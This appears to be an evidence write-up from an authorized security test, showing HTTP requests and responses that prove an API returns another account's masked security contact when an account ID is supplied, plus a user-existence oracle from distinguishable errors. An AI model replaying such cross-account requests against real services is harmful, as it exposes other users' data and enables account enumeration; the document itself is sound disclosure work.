# Evidence — cross-account masked security contact

All requests were made from the authenticated account A session
(`AccountID=3000823185`) against the authorized target origin. No cookies,
CSRF tokens, or session identifiers are reproduced here.

## Control: account A own contact

```http
POST /api/workorder/ticket/GetAccountMaskedSecurityContact
Content-Type: application/json

{}
```

```json
{
  "Result": {
    "SecurityEmail": "a*************@*****************",
    "SecurityTel": "+31******47048",
    "EmailVerified": 1,
    "TelVerified": 1
  }
}
```

## Cross-account: account B contact by AccountID

```http
POST /api/workorder/ticket/GetAccountMaskedSecurityContact
Content-Type: application/json

{"AccountID":3001021825}
```

```json
{
  "Result": {
    "SecurityEmail": "t***********@********",
    "SecurityTel": "",
    "EmailVerified": 1,
    "TelVerified": 0
  }
}
```

The same result was returned for the alternate JSON spellings `AccountId` and
`accountID`, demonstrating that the service accepts a caller-controlled account
identifier rather than deriving it from the authenticated session.

## Additional observation: user contact lookup oracle

```http
POST /api/workorder/ticket/GetUserMaskedSecurityContact
Content-Type: application/json

{"UserId":3001021825}
```

```json
{
  "ResponseMetadata": {
    "Error": {
      "Code": "UserSecurityContactNotExist",
      "Message": "the user security contact not exist"
    }
  }
}
```

The endpoint accepts an arbitrary numeric `UserId` and returns a distinguishable
error when a contact does not exist. The response is masked / non-sensitive and
is therefore also excluded from notification.
